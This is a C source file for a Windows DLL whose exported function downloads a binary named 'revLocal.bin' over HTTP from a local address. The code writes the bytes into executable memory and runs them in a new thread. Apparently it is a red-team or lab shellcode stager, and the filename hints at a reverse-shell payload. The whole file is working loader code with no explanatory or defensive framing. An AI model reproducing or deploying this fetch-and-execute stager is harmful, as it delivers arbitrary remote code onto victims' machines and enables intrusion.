#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

DWORD HTTPGetExec()
{
    printf("[+] In HTTPGetExec\n");
    HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession == NULL)
    {
        printf("[!] WinHttpOpen failed with %lu\n", GetLastError());
        return -1;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 80, 0);
    if (hConnect == NULL)
    {
        printf("[!] WinHttpConnect failed with %lu\n", GetLastError());
        return -1;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"revLocal.bin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
    if (hRequest == NULL)
    {
        printf("[!] WinHttpOpenRequest failed with %lu\n", GetLastError());
        return -1;
    }

    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (bResults == FALSE)
    {
        printf("[!] WinHTTPSendRequest failed with %lu\n", GetLastError());
        return -1;
    }

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (bResults == FALSE)
    {
        printf("[!] WinHttpReceiveResponse failed with %lu\n", GetLastError());
        return -1;
    }

    DWORD bytesAvailable;
    DWORD bytesRead;
    LPSTR pOutBuffer;
    LPSTR pReallocStore;
    LPSTR pStoreBuffer = malloc(0);
    DWORD dStoreBuffSize = 0;
    do
    {
        if (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) == FALSE)
        {
            printf("[!] WinHttpQueryDataAvailable failed with %lu\n", GetLastError());
            return -1;
        }

        pOutBuffer = (LPSTR)malloc(bytesAvailable + 1);
        ZeroMemory(pOutBuffer, bytesAvailable + 1);

        if (WinHttpReadData(hRequest, pOutBuffer, bytesAvailable, &bytesRead) == FALSE)
        {
            printf("[!] WinHttpReadData failed with %lu\n", GetLastError());
            free(pOutBuffer);
            return -1;
        }
        pStoreBuffer = (LPSTR)realloc(pStoreBuffer, dStoreBuffSize + (bytesAvailable + 1));
        memcpy((&pStoreBuffer[dStoreBuffSize]), pOutBuffer, bytesAvailable + 1);
        dStoreBuffSize += (bytesAvailable + 1);

        free(pOutBuffer);

    } while (bytesAvailable > 0);

    char* ptr = VirtualAlloc(NULL, dStoreBuffSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (ptr == NULL)
    {
        printf("VirtualAlloc failed with: %lu\n", GetLastError());
        exit(-1);
    }
    memcpy(ptr, pStoreBuffer, dStoreBuffSize);

    HANDLE* hCalc = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, NULL);
    if (hCalc == NULL)
    {
        printf("CreateThread failed with: %lu\n", GetLastError());
        exit(-1);
    }
    const DWORD dWaitStatus = WaitForSingleObject(hCalc, 2000);
    if (dWaitStatus == (DWORD)0xFFFFFFFF)
    {
        printf("WaitForSingleObject failed with %lu\n", GetLastError());
        exit(-1);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    free(pStoreBuffer);
    return 0;
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            printf("[+] DLL Loaded.\n");
            break;
        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

extern __declspec(dllexport) void doThing(void)
{
    printf("[*] doThing called\n");
    HTTPGetExec();
}
